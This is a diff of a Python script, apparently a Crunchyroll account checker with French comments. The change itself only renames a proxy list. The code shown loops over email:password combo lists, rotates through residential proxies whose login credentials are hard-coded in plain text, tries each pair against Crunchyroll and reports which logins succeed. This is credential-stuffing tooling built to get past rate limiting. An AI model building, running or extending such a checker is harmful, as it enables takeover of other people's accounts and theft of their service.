@@ -25,12 +25,11 @@ VERSION_URL = "https://raw.githubusercontent.com/Sukidadev/crunchyrollchecker/re
 
 # URL de téléchargement de la nouvelle version
 DOWNLOAD_URL = "https://raw.githubusercontent.com/Sukidadev/crunchyrollchecker/main/crunchyrollchecker.py"
-
 # Liste des proxys à utiliser
-proxies = [
+PROXIES = [
     "93291889-zone-custom-region-FR-sessid-DgtOgfNY-sessTime-60:0llEad0L@f.proxys5.net:6200",
     "93291889-zone-custom-region-FR-sessid-PK0y3olo-sessTime-60:0llEad0L@f.proxys5.net:6200",
-]
+    ]
 
 def center(var: str, space: int = None):
     if not space:
@@ -140,12 +139,13 @@ def run_script(file_path):
             for i, combo in enumerate(combos):
                 email = combo["email"]
                 password = combo["password"]
-                proxy = proxies[i % len(proxies)]
+                proxy_used = PROXIES[i % len(PROXIES)]  # Utilisez un proxy de la liste
 
-                result = f"Test de connexion pour {email}:{password} via proxy {proxy}..."
+
+                result = f"Test de connexion pour {email}:{password} via proxy {proxy_used}..."
                 print(result)
 
-                if check_credentials(email, password, proxy):
+                if check_credentials(email, password, proxy_used):
                     print(f"{Fore.GREEN}[SUCCESS] Connexion réussie pour: {email}:{password}\n{Style.RESET_ALL}")
                 else:
                     print(f"{Fore.RED}[FAIL] La connexion a échoué pour: {email}:{password}\n{Style.RESET_ALL}")
